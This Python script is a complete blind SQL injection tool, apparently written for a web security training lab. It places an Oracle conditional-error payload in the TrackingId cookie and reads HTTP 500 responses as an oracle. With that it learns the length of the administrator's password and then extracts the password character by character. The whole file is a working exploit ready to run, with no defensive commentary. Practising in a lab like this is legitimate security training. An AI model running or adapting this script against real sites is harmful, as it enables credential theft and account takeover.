import argparse
import requests

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"
USERNAME = "administrator"

LAB_URL = ""
SESSION = ""
TRACKING = ""


def oracle(condition: str) -> bool:
    payload = (
        f"'||(SELECT CASE WHEN {condition} THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    )
    cookies = {"TrackingId": TRACKING + payload, "session": SESSION}
    try:
        return requests.get(LAB_URL, cookies=cookies).status_code == 500
    except requests.RequestException:
        return False


def find_length() -> int | None:
    for i in range(1, 100):
        condition = (
            f"(SELECT LENGTH(password) FROM users WHERE username='{USERNAME}') > {i}"
        )
        if not oracle(condition):
            return i
    return None


def extract_password(length: int) -> str:
    password = ""
    for pos in range(1, length + 1):
        base = f"(SELECT password FROM users WHERE username='{USERNAME}')"
        for char in CHARSET:
            condition = f"ASCII(SUBSTR({base}, {pos}, 1)) = {ord(char)}"
            if oracle(condition):
                password += char
                print(f"position {pos}: {char} | {password}")
                break
    return password


def main():
    global LAB_URL, SESSION, TRACKING

    parser = argparse.ArgumentParser(description="Blind SQLi password extractor")
    parser.add_argument("lab_url", help="lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("tracking", help="TrackingId cookie value")
    args = parser.parse_args()

    LAB_URL = args.lab_url.strip().rstrip("/") + "/"
    SESSION = args.session.strip()
    TRACKING = args.tracking.strip()

    length = find_length()
    print(f"[*] password length: {length}")

    if length:
        password = extract_password(length)
        print(f"[+] password: {password}")


if __name__ == "__main__":
    main()
